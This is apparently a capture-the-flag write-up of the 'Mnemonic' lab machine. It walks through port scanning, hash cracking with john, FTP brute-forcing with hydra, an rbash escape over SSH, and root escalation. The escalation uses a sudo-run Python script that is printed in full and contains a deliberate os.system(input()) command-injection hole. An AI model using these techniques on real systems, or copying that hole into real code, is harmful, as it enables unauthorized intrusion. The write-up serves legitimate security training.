# Mnemonic

## Enumeration
```
# Nmap 7.91 scan initiated Sun Jun 27 13:22:51 2021 as: nmap -sCV -oN nmap/initial -vvv -p 21,80,1337 10.10.128.167
Nmap scan report for 10.10.128.167
Host is up, received reset ttl 61 (0.18s latency).
Scanned at 2021-06-27 13:22:52 PDT for 14s

PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 61 vsftpd 3.0.3
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_/webmasters/*
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1337/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e0:42:c0:a5:7d:42:6f:00:22:f8:c7:54:aa:35:b9:dc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+cUIYV9ABbcQFihgqbuJQcxu2FBvx0gwPk5Hn+Eu05zOEpZRYWLq2CRm3++53Ty0R7WgRwayrTTOVt6V7yEkCoElcAycgse/vY+U4bWr4xFX9HMNElYH1UztZnV12il/ep2wVd5nn//z4fOllUZJlGHm3m5zWF/k5yIh+8x7T7tfYNsoJdjUqQvB7IrcKidYxg/hPDWoZ/C+KMXij1n3YXVoDhQwwR66eUF1le90NybORg5ogCfBLSGJQhZhALBLLmxAVOSc4e+nhT/wkhTkHKGzUzW6PzA7fTN3Pgt81+m9vaxVm/j7bXG3RZSzmKlhrmdjEHFUkLmz6bjYu3201
|   256 23:eb:a9:9b:45:26:9c:a2:13:ab:c1:ce:07:2b:98:e0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOJp4tEjJbtHZZtdwGUu6frTQk1CzigA1PII09LP2Edpj6DX8BpTwWQ0XLNSx5bPKr5sLO7Hn6fM6f7yOy8SNHU=
|   256 35:8f:cb:e2:0d:11:2c:0b:63:f2:bc:a0:34:f3:dc:49 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIiax5oqQ7hT7CgO0CC7FlvGf3By7QkUDcECjpc9oV9k
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 27 13:23:06 2021 -- 1 IP address (1 host up) scanned in 14.62 seconds
```

We have ftp on port 21 but looks like we didn't detect anonymous login, a web server on port 80 with a robots.txt file revealing a webmaster directory, and finally ssh on the non-standard port 1337. Lets checkout the web server

## Web Server Port 80

The main page and the webmasters directory are both empty but lets start by enumerating on the /webmasters directory, given that they went out of their way to put it in the robots.txt file.
```
/index.html           (Status: 200) [Size: 0]
/admin                (Status: 301) [Size: 325] [--> http://10.10.128.167/webmasters/admin/]
/backups              (Status: 301) [Size: 327] [--> http://10.10.128.167/webmasters/backups/]
```

After a little bit we find two interesting directories but both are empty. However /webmasters/backups might be worth enumerating with some intuitive extensions such as zip, tar, bak. 

After a little bit we get a hit on a zip file. However, this zip file is password protected so we use zip2john and then use john to crack the password rather quickly. 

After opening the resulting note.txt file we now have a ftp username to use, as well as two other possible usernames we may see later,@vill and james. It still needs a password though so lets try and crack it again with hydra.

We sucessfully get the password and login to ftp. We quite a few folders however we can see that only one of the folders actually has files inside so we go there and send the two interesting files over to our machine.

One of the files is a note that further confirms a username. The other is a private ssh key, however it is encrypted so we need to go use ssh2john and then try and crack the password.

We again quickly crack the password and now we can go ahead and ssh to server as the user james.

## Initial foothold

Upon connecting as we start to try and execute commands we realize we are on a rbash (restricte) shell so we can add bash to our ssh command to avoid this.
```
ssh -i id_rsa james@10.10.128.167 -p 1337 bash
```

We go ahead and use python to upgrade our shell and we find the following two notes

noteforjames.txt
```
@vill

james i found a new encryption İmage based name is Mnemonic

I created the condor password. don't forget the beers on saturday
```

6450.txt
```
5140656
354528
842004
1617534
465318
1617534
509634
1152216
753372
265896
265896
15355494
24617538
3567438
15355494
```

Looking in the home directory we find that condor is a user on the system, however we cannot cd into the directory however we can get a directory listing and find two base64 encoded strings. We go ahead and decode these.

One provides us a flag which is the user.txt flag. The other is url link to an image. The note referenced an image encryption named mnemonic so we go ahead and save this image and do some searching on this encryption. Looks like we can use mnemonic to decode a message from the image in conjuction with the 6450.txt file we also found earlier after doing this we get a password and can use it to switch over to the condor user.

## Root Escalation

We have the following sudo perimissions
```
condor@mnemonic:~$ sudo -l
[sudo] password for condor:
Matching Defaults entries for condor on mnemonic:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User condor may run the following commands on mnemonic:
    (ALL : ALL) /usr/bin/python3 /bin/examplecode.py
```

We cannot write to the binary however we can read it so lets look at the code
```
#!/usr/bin/python3
import os
import time
import sys
def text(): #text print


        print("""

        ------------information systems script beta--------
        ---------------------------------------------------
        ---------------------------------------------------
        ---------------------------------------------------
        ---------------------------------------------------
        ---------------------------------------------------
        ---------------------------------------------------
        ----------------@author villwocki------------------""")
        time.sleep(2)
        print("\nRunning...")
        time.sleep(2)
        os.system(command="clear")
        main()


def main():
        info()
        while True:
                select = int(input("\nSelect:"))

                if select == 1:
                        time.sleep(1)
                        print("\nRunning")
                        time.sleep(1)
                        x = os.system(command="ip a")
                        print("Main Menü press '0' ")
                        print(x)

                if select == 2:
                        time.sleep(1)
                        print("\nRunning")
                        time.sleep(1)
                        x = os.system(command="ifconfig")
                        print(x)

                if select == 3:
                        time.sleep(1)
                        print("\nRunning")
                        time.sleep(1)
                        x = os.system(command="ip route show")
                        print(x)

                if select == 4:
                        time.sleep(1)
                        print("\nRunning")
                        time.sleep(1)
                        x = os.system(command="cat /etc/os-release")
                        print(x)

                if select == 0:
                        time.sleep(1)
                        ex = str(input("are you sure you want to quit ? yes : "))

                        if ex == ".":
                                print(os.system(input("\nRunning....")))
                        if ex == "yes " or "y":
                                sys.exit()


                if select == 5:                     #root
                        time.sleep(1)
                        print("\nRunning")
                        time.sleep(2)
                        print(".......")
                        time.sleep(2)
                        print("System rebooting....")
                        time.sleep(2)
                        x = os.system(command="shutdown now")
                        print(x)

                if select == 6:
                        time.sleep(1)
                        print("\nRunning")
                        time.sleep(1)
                        x = os.system(command="date")
                        print(x)




                if select == 7:
                        time.sleep(1)
                        print("\nRunning")
                        time.sleep(1)
                        x = os.system(command="rm -r /tmp/*")
                        print(x)










def info():                         #info print function
        print("""

        #Network Connections   [1]

        #Show İfconfig         [2]

        #Show ip route         [3]

        #Show Os-release       [4]

        #Root Shell Spawn      [5]

        #Print date            [6]

        #Exit                  [0]

        """)

def run(): # run function
        text()

run()
```

Looks like the option to spawn a root shell is actual a trick and instead shutsdown the machine however there is some interesting behavior on the exit option [0]. If we input a '.' it waits for user input to run as an os.system(user input) function call. So we go ahead and the run the binary choose this option path and then input /bin/bash and voila we have a root shell! We can find the root flag at /root/root.txt, and hash the portion {string} as md5 to get the actual flag.